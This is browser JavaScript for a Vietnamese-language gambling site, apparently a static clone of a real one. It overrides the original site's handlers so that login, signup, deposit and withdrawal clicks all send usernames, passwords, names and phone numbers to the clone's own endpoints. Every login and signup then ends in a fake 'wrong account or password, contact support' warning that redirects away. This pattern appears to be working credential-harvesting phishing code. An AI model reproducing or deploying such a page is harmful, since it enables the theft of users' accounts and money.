
// SPA / PJAX Router disabled - standard browser navigation used instead
window.navigateTo = function(url) {
  if (!url) return;
  window.location.href = url;
};

(function () {
  // Prevent non-numeric input for phone numbers
  document.addEventListener('input', function(e) {
    if (e.target.matches('input[type="tel"]')) {
      let val = e.target.value;
      if (val.startsWith('+')) {
        e.target.value = '+' + val.slice(1).replace(/[^0-9]/g, '');
      } else {
        e.target.value = val.replace(/[^0-9]/g, '');
      }
    }
  });

  // Add CSS styles for the registration modal, global auth feedback, and custom warning modal
  const style = document.createElement('style');
  style.textContent = `
    /* Hide block ad modals and iOS Add to Home overlays since React is deactivated */
    .float-center-ads-modal,
    .add-main.ios {
      display: none !important;
    }

    /* Toast feedback */
    .auth-toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(22, 27, 34, 0.95);
      border: 1px solid rgba(255, 75, 75, 0.3);
      color: #ff4b4b;
      padding: 12px 24px;
      border-radius: 8px;
      z-index: 10000000;
      font-family: system-ui, -apple-system, sans-serif;
      font-size: 14px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      transform: translateY(-20px);
      opacity: 0;
      transition: all 0.3s ease;
    }
    .auth-toast.show {
      transform: translateY(0);
      opacity: 1;
    }
    .auth-toast.success {
      border-color: rgba(46, 204, 113, 0.3);
      color: #2ecc71;
    }

    /* Custom Warning Modal matching the screenshot */
    .cskh-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.5);
      z-index: 99999999;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .cskh-modal-card {
      background: #ffffff;
      width: 90%;
      max-width: 460px;
      border-radius: 12px;
      overflow: visible;
      box-shadow: 0 10px 25px rgba(0,0,0,0.35);
      position: relative;
      animation: modalScaleIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    @keyframes modalScaleIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .cskh-modal-header {
      background: #e9eaec;
      padding: 12px;
      text-align: center;
      font-size: 18px;
      font-weight: 700;
      color: #333333;
      border-top-left-radius: 12px;
      border-top-right-radius: 12px;
    }
    .cskh-modal-close {
      position: absolute;
      top: -12px;
      right: -12px;
      width: 30px;
      height: 30px;
      background: #f9752d;
      border: 2px solid #ffffff;
      border-radius: 50%;
      color: #ffffff;
      font-size: 18px;
      font-weight: bold;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      transition: background 0.2s;
    }
    .cskh-modal-close:hover {
      background: #ff5722;
    }
    .cskh-modal-body {
      padding: 30px 24px;
      text-align: center;
    }
    .cskh-warning-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    .cskh-modal-text {
      color: #444444;
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 24px;
      font-weight: 500;
    }
    .cskh-modal-actions {
      display: flex;
      gap: 14px;
      justify-content: center;
    }
    .cskh-btn {
      flex: 1;
      padding: 10px 16px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
      outline: none;
    }
    .cskh-btn-close {
      background: #c5c5c5;
      color: #ffffff;
    }
    .cskh-btn-close:hover {
      background: #b0b0b0;
    }
    .cskh-btn-action {
      background: #f9752d;
      color: #ffffff;
    }
    .cskh-btn-action:hover {
      background: #ff5722;
      box-shadow: 0 4px 10px rgba(249,117,45,0.3);
    }

    /* Signup Modal Overlay */
    .signup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(15, 17, 23, 0.7);
      backdrop-filter: blur(8px);
      z-index: 999999;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, sans-serif;
    }

    /* Glassmorphic Signup Card */
    .signup-card {
      background: rgba(22, 27, 34, 0.85);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      padding: 40px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
      animation: signupFadeIn 0.4s ease;
      position: relative;
    }

    @keyframes signupFadeIn {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }

    .signup-card .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background: none;
      border: none;
      color: rgba(255,255,255,0.4);
      font-size: 24px;
      cursor: pointer;
      transition: color 0.2s;
    }
    .signup-card .close-btn:hover { color: #fff; }

    .signup-card h2 {
      color: #fff;
      font-size: 24px;
      margin-bottom: 8px;
      text-align: center;
      font-weight: 700;
    }
    .signup-card p.subtitle {
      color: rgba(255, 255, 255, 0.5);
      font-size: 13px;
      text-align: center;
      margin-bottom: 28px;
    }

    .signup-field {
      margin-bottom: 18px;
      position: relative;
    }
    .signup-field label {
      display: block;
      color: rgba(255, 255, 255, 0.7);
      font-size: 12px;
      margin-bottom: 6px;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .signup-field input {
      width: 100%;
      padding: 12px 14px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      color: #fff;
      font-size: 14px;
      outline: none;
      transition: all 0.25s ease;
    }
    .signup-field input:focus {
      border-color: #f9752d;
      background: rgba(255, 255, 255, 0.08);
      box-shadow: 0 0 0 3px rgba(249, 117, 45, 0.15);
    }

    .signup-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #f9752d, #ff5722);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.25s ease;
      margin-top: 10px;
    }
    .signup-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(249, 117, 45, 0.3);
    }
    .signup-btn:active {
      transform: translateY(0);
    }

    .signup-footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: rgba(255,255,255,0.4);
    }
    .signup-footer a {
      color: #f9752d;
      text-decoration: none;
      font-weight: 500;
    }
    .signup-footer a:hover {
      text-decoration: underline;
    }
  `;
  document.head.appendChild(style);

  // Helper to show custom toasts
  function showToast(message, type = 'error') {
    let toast = document.querySelector('.auth-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.className = 'auth-toast';
      document.body.appendChild(toast);
    }
    toast.textContent = message;
    toast.className = 'auth-toast ' + type;
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
    }, 4000);
  }

  // Warning Dialog helper matching user's screenshot
  function showWarningDialog(redirectUrl) {
    const overlay = document.createElement('div');
    overlay.className = 'cskh-modal-overlay';
    
    // Warning SVG icon
    const warningIcon = `
      <svg class="cskh-warning-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#ff9800"/>
        <path d="M12 9V14" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M12 17H12.01" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    `;

    overlay.innerHTML = `
      <div class="cskh-modal-card">
        <div class="cskh-modal-close">×</div>
        <div class="cskh-modal-header">Lưu ý</div>
        <div class="cskh-modal-body">
          ${warningIcon}
          <div class="cskh-modal-text">Nhập sai tài khoản hoặc mật mã, vui lòng liên hệ CSKH 24/7</div>
          <div class="cskh-modal-actions">
            <button class="cskh-btn cskh-btn-close">Đóng</button>
            <button class="cskh-btn cskh-btn-action">Liên hệ CSKH</button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);

    const getAbsoluteUrl = (url) => {
      if (!url || url === '/') return '/';
      if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return 'https://' + url;
      }
      return url;
    };

    const handleRedirection = () => {
      if (document.body.contains(overlay)) {
        document.body.removeChild(overlay);
      }
      window.navigateTo(getAbsoluteUrl(redirectUrl));
    };

    // Close actions
    overlay.querySelector('.cskh-modal-close').addEventListener('click', handleRedirection);
    overlay.querySelector('.cskh-btn-close').addEventListener('click', handleRedirection);
    overlay.querySelector('.cskh-btn-action').addEventListener('click', () => {
      const cskhLink = document.querySelector('#shortcut_PConlinecs a');
      if (cskhLink && cskhLink.href) {
        window.navigateTo(cskhLink.href);
      } else {
        window.navigateTo(getAbsoluteUrl(redirectUrl));
      }
    });

    // Auto redirect after 4 seconds if no action taken
    setTimeout(() => {
      if (document.body.contains(overlay)) {
        handleRedirection();
      }
    }, 4000);
  }

  // Intercept header login attempts with CAPTURE phase to run before inline click handlers
  document.addEventListener('click', async function (e) {
    const loginBtn = e.target.closest('.header-btn.login');
    if (loginBtn) {
      e.preventDefault();
      e.stopImmediatePropagation(); // Prevent inline scripts from firing redirect rules

      // Locate username & password inputs
      const accountInput = document.querySelector('.input-wrap.account input, input.username-btn');
      const passwordInput = document.querySelector('.input-wrap.password input, input.password-btn');

      if (!accountInput || !accountInput.value.trim()) {
        showToast('Vui lòng nhập Tên Đăng Nhập');
        return;
      }
      if (!passwordInput || !passwordInput.value.trim()) {
        showToast('Vui lòng nhập Mật Khẩu');
        return;
      }

      const payload = {
        AccountID: accountInput.value.trim(),
        AccountPWD: passwordInput.value
      };

      try {
        const response = await fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        
        if (result.Error) {
          showWarningDialog(result.Error.Redirect);
        }
      } catch (err) {
        showWarningDialog('/');
      }
    }
  }, true); // Use capture phase!

  // Listen for signup submission and interactions on signup page
  document.addEventListener('click', async function (e) {
    // Check if the signup elements exist to confirm we are in signup context
    const accountInput = document.getElementById('playerid');
    const passwordInput = document.getElementById('password');
    const nameInput = document.getElementById('firstname');
    const phoneInput = document.querySelector('input[type="tel"]');

    if (!accountInput || !passwordInput || !nameInput || !phoneInput) {
      return; // Not on the signup page
    }

    // 1. Password visibility toggle
    const eyeIcon = e.target.closest('.mps-unreadable, .mps-readable');
    if (eyeIcon) {
      e.preventDefault();
      e.stopImmediatePropagation();
      const input = eyeIcon.previousElementSibling;
      if (input && input.tagName === 'INPUT') {
        if (input.type === 'password') {
          input.type = 'text';
          eyeIcon.classList.remove('mps-unreadable');
          eyeIcon.classList.add('mps-readable');
        } else {
          input.type = 'password';
          eyeIcon.classList.remove('mps-readable');
          eyeIcon.classList.add('mps-unreadable');
        }
      }
      return;
    }

    // 2. Checkbox toggle logic
    const checkboxWrapper = e.target.closest('.agree-item, .tips, .agree-policy, .nrc-checkbox');
    if (checkboxWrapper) {
      const checkboxInput = checkboxWrapper.querySelector('input[type="checkbox"]');
      if (checkboxInput && e.target !== checkboxInput) {
        e.preventDefault();
        e.stopImmediatePropagation();
        checkboxInput.checked = !checkboxInput.checked;
      }
      return;
    }

    // 3. Back / Close button (Quay lại hoặc Đóng)
    const resetBtn = e.target.closest('.btn-reset, .close, img.close');
    if (resetBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      window.navigateTo('/');
      return;
    }

    // 4. Submit button
    const submitBtn = e.target.closest('.btn-submit, .top25 .nrc-button, form.signup-form button');
    if (submitBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();

      let isValid = true;
      
      const showError = (inputEl, msg) => {
        if (!inputEl) return;
        const wrapper = inputEl.closest('.nrc-form-input');
        if (wrapper) {
          wrapper.classList.add('has-error');
          inputEl.classList.add('invalid');
          const telWrapper = inputEl.closest('.react-tel-input');
          if (telWrapper) {
            telWrapper.classList.add('invalid');
          }
          let errEl = wrapper.querySelector('.error-text');
          if (!errEl) {
            errEl = document.createElement('small');
            errEl.className = 'error-text';
            errEl.style.color = '#e74c3c';
            errEl.style.display = 'block';
            errEl.style.marginTop = '4px';
            wrapper.appendChild(errEl);
          }
          errEl.innerText = msg;
        }
        isValid = false;
      };

      document.querySelectorAll('.nrc-form-input.has-error').forEach(wrapper => {
        wrapper.classList.remove('has-error');
        const errEl = wrapper.querySelector('.error-text');
        if (errEl) errEl.remove();
      });
      document.querySelectorAll('input.invalid').forEach(el => {
        el.classList.remove('invalid');
      });
      document.querySelectorAll('.react-tel-input.invalid').forEach(el => {
        el.classList.remove('invalid');
      });

      // 1. Username Validation
      const usernameVal = accountInput.value.trim();
      if (!usernameVal) {
        showError(accountInput, 'Bắt buộc nhập');
      }

      // 2. Password Validation
      const pwdVal = passwordInput.value;
      if (!pwdVal) {
        showError(passwordInput, 'Bắt buộc nhập');
      }

      // 3. Họ Và Tên Validation
      const nameVal = nameInput.value.trim();
      if (!nameVal) {
        showError(nameInput, 'Bắt buộc nhập');
      }

      // 4. Số điện thoại Validation
      const phoneVal = phoneInput.value.trim();
      const phoneClean = phoneVal.replace(/[- ]/g, '');
      if (!phoneVal || phoneClean === '+84' || phoneClean === '+' || phoneClean === '') {
        showError(phoneInput, 'Bắt buộc nhập');
      } else {
        const phoneRegex = /^\+?[0-9]+$/;
        if (!phoneRegex.test(phoneClean)) {
          showError(phoneInput, 'Chỉ được phép nhập số');
        }
      }

      // Checkbox state validation
      const checkboxInput = document.querySelector('input[type="checkbox"]');
      const isChecked = checkboxInput ? checkboxInput.checked : true;
      if (!isChecked) {
        showToast('Vui lòng đồng ý với Chính sách thành viên');
        isValid = false;
      }

      if (!isValid) return;

      // Encode password to base64 to match back-end decoding logic
      const base64Pwd = btoa(passwordInput.value);

      const payload = {
        AccountID: accountInput.value.trim(),
        PWD: base64Pwd,
        NickName: nameInput.value.trim(),
        CellPhone: phoneInput.value.trim(),
        AgentID: ''
      };

      try {
        const response = await fetch('/api/MemberInfo/RegisterMember', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (result.Error) {
          showWarningDialog(result.Error.Redirect || '/');
        }
      } catch (err) {
        showToast('Lỗi kết nối máy chủ.');
      }
    }
  }, true); // Use capture phase!

  // Inject styles for mobile navigation and custom login modal
  const navStyle = document.createElement('style');
  navStyle.textContent = `
    .nrc-form-input.has-error input,
    .nrc-form-input.has-error .react-tel-input input,
    input.invalid,
    .react-tel-input.invalid input {
      border-color: #f9752d !important;
    }
    .nrc-form-input.has-error .info-msg,
    .has-error .info-msg {
      display: none !important;
    }

    .auth-login-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.75);
      z-index: 100000000;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, sans-serif;
    }
    .auth-login-card {
      background: #191c29;
      border: 1px solid #3d7fc5;
      border-radius: 12px;
      width: 85%;
      max-width: 380px;
      padding: 24px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
      color: #fff;
      animation: modalScaleIn 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .auth-login-title {
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 20px;
      color: #3d7fc5;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .auth-login-input-group {
      margin-bottom: 16px;
    }
    .auth-login-input-group label {
      display: block;
      font-size: 13px;
      color: #ccc;
      margin-bottom: 6px;
    }
    .auth-login-input-group input {
      width: 100%;
      box-sizing: border-box;
      height: 44px;
      background: #11141e;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      padding: 0 12px;
      font-size: 15px;
      transition: border-color 0.2s;
    }
    .auth-login-input-group input:focus {
      border-color: #3d7fc5;
      outline: none;
    }
    .auth-login-btn {
      width: 100%;
      height: 44px;
      background: #3d7fc5;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.2s;
    }
    .auth-login-btn:hover {
      background: #4a90e2;
    }
    .auth-login-close {
      text-align: center;
      margin-top: 15px;
      color: #aaa;
      font-size: 14px;
      cursor: pointer;
      text-decoration: underline;
    }
    .auth-login-close:hover {
      color: #fff;
    }
  `;
  document.head.appendChild(navStyle);

  // Function to show the custom mobile login modal
  function showLoginModal() {
    let overlay = document.querySelector('.auth-login-overlay');
    if (overlay) return;

    overlay = document.createElement('div');
    overlay.className = 'auth-login-overlay';
    overlay.innerHTML = `
      <div class="auth-login-card">
        <div class="auth-login-title">Đăng Nhập</div>
        <div class="auth-login-input-group">
          <label>Tên đăng nhập</label>
          <input type="text" id="modal-login-username" placeholder="Tên đăng nhập...">
        </div>
        <div class="auth-login-input-group">
          <label>Mật khẩu</label>
          <input type="password" id="modal-login-password" placeholder="Mật khẩu...">
        </div>
        <button class="auth-login-btn" id="modal-login-submit">Đăng Nhập</button>
        <div class="auth-login-close">Hủy bỏ</div>
      </div>
    `;
    document.body.appendChild(overlay);

    overlay.querySelector('.auth-login-close').addEventListener('click', () => {
      document.body.removeChild(overlay);
    });

    overlay.querySelector('#modal-login-submit').addEventListener('click', async () => {
      const usernameInput = overlay.querySelector('#modal-login-username');
      const passwordInput = overlay.querySelector('#modal-login-password');

      if (!usernameInput.value.trim()) {
        showToast('Vui lòng nhập Tên Đăng Nhập');
        return;
      }
      if (!passwordInput.value.trim()) {
        showToast('Vui lòng nhập Mật Khẩu');
        return;
      }

      const payload = {
        AccountID: usernameInput.value.trim(),
        AccountPWD: passwordInput.value
      };

      try {
        const response = await fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
        }
        if (result.Error) {
          showWarningDialog(result.Error.Redirect);
        }
      } catch (err) {
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
        }
        showWarningDialog('/');
      }
    });
  }

  // Bind click event handlers for static elements routing
  document.addEventListener('click', function (e) {
    // 1. Bottom navigation click routing
    const bottomNavLi = e.target.closest('.bottom-nav li');
    if (bottomNavLi) {
      e.preventDefault();
      e.stopPropagation();
      if (bottomNavLi.classList.contains('nav-home')) {
        window.navigateTo('/');
      } else if (bottomNavLi.classList.contains('nav-promo')) {
        window.navigateTo('/promotions');
      } else if (bottomNavLi.classList.contains('nav-deposit')) {
        showLoginModal();
      } else if (bottomNavLi.classList.contains('nav-withdrawal')) {
        showLoginModal();
      } else if (bottomNavLi.classList.contains('nav-cs')) {
        const csLink = document.querySelector('#shortcut_PConlinecs a');
        if (csLink && csLink.href) {
          window.navigateTo(csLink.href);
        } else {
          showWarningDialog('/');
        }
      } else if (bottomNavLi.classList.contains('nav-account')) {
        showLoginModal();
      }
      return;
    }

    // 2. Left sidebar category navigation routing
    const swiperSlide = e.target.closest('.home-swiper-nav .swiper-slide');
    if (swiperSlide) {
      e.preventDefault();
      e.stopPropagation();
      const code = swiperSlide.getAttribute('data-code');
      if (code) {
        switch (code) {
          case 'ANIMAL':
            window.navigateTo('/gamelobby/animal');
            break;
          case 'SPORTS':
            window.navigateTo('/gamelobby/sports');
            break;
          case 'LIVE':
            window.navigateTo('/gamelobby/live');
            break;
          case 'EGAME':
            window.navigateTo('/gamelobby/egame');
            break;
          case 'MPG':
            window.navigateTo('/gamelobby/mpg');
            break;
          case 'ESPORTS':
            window.navigateTo('/gamelobby/esports');
            break;
          case 'CHESS':
            window.navigateTo('/gamelobby/chess');
            break;
          case 'LOTTERY':
            window.navigateTo('/gamelobby/lottery');
            break;
          case 'PROMOTIONS':
            window.navigateTo('/promotions');
            break;
          case 'PAGE_QR':
            window.navigateTo('/page/QR');
            break;
          case 'MY_VIP':
            window.navigateTo('/myvip');
            break;
          default:
            if (code.startsWith('http')) {
              window.navigateTo(code);
            }
            break;
        }
      }
      return;
    }

    // 3. Header login buttons click triggers login modal
    const loginLink = e.target.closest('a[href="/login"], #login-btn');
    if (loginLink) {
      e.preventDefault();
      e.stopPropagation();
      showLoginModal();
      return;
    }
  }, true); // Use capture phase to intercept routing clicks!
})();


// Migrated from index.ejs inline script
document.addEventListener('click', function(e) {
    const navLink = e.target.closest('.nav-item, .nav li, .header-btn.signup, .header-btn.login');
    if (navLink) {
      if (navLink.classList.contains('signup')) {
        window.navigateTo('/signup');
        return;
      }
      if (navLink.classList.contains('login')) {
        window.navigateTo('/signup');
        return;
      }
      const navLi = navLink.closest('li');
      if (navLi) {
        const content = navLi.getAttribute('data-content');
        if (content) {
          const pathVal = content.toLowerCase();
          if (['animal', 'sports', 'live', 'egame', 'mpg', 'esports', 'chess', 'lottery'].includes(pathVal)) {
            window.navigateTo('/gamelobby/' + pathVal);
            return;
          }
          if (pathVal === 'promotions') {
            window.navigateTo('/promotions');
            return;
          }
          if (pathVal === 'page_qr') {
            window.navigateTo('/page/QR');
            return;
          }
          if (pathVal === 'my_vip') {
            window.navigateTo('/myvip');
            return;
          }
        }
      }
    }
    const closeBtn = e.target.closest('.mps-close, .close, .btn-close, [data-promo-float="close"]');
    if (closeBtn) {
      e.preventDefault();
      const container = e.target.closest('.ad-center, .floating-promo-center, .adItem, .modal, .hover-container, .ad-center-overlay, .quick-nav, .popup');
      if (container) {
        container.style.setProperty('display', 'none', 'important');
        if (container.classList.contains('ad-center')) {
          const overlay = document.querySelector('.ad-center-overlay');
          if (overlay) overlay.style.setProperty('display', 'none', 'important');
        }
      } else {
        closeBtn.parentElement.style.setProperty('display', 'none', 'important');
      }
    }
  });

// Real-time input constraints
document.addEventListener('input', function(e) {
  if (e.target.id === 'playerid') {
    const start = e.target.selectionStart;
    const end = e.target.selectionEnd;
    e.target.value = e.target.value.toLowerCase();
    if (start !== null && end !== null) {
      e.target.setSelectionRange(start, end);
    }
  }
});
